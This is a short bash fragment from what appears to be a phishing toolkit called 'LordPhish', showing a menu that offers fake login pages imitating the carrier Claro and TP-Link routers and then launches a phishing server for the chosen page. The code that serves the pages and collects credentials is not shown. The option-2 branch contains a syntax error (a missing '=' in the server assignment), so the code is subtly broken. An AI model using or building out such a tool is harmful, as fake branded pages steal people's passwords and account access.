#!/usr/bin/env bash

operadoras () {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Claro Fake Page\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m TP-Link Fake Page\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    

if [[ $op_menu == 1 || $op_menu == 01 ]]; then
server="claro"
start1
    

elif [[ $op_menu == 2 || $op_menu == 02 ]]; then
server"tplink"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}
